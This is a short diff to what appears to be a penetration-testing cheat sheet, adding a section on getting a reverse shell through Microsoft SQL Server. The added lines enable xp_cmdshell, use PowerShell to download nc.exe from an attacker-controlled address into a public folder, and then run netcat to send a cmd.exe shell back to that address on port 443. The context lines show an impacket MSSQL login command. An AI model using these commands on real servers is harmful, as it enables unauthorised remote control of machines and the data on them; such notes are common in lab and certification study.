@@ -57,6 +57,12 @@ Set User-Agent to "User-Agent: Googlebot/2.1 (+http://www.googlebot.com/bot.html
 ```
 impacket-mssqlclient user:password@10.11.10.10
 ```
+Reverse shell using xp_cmdshell:
+```
+enable_xp_cmdshell
+xp_cmdshell "powershell.exe wget http://192.168.119.134/nc.exe -OutFile C:\\Users\Public\nc.exe"
+xp_cmdshell "C:\Users\Public\nc.exe -e cmd.exe 192.168.119.134 443
+```
 
 ## Bad Characters
 ```
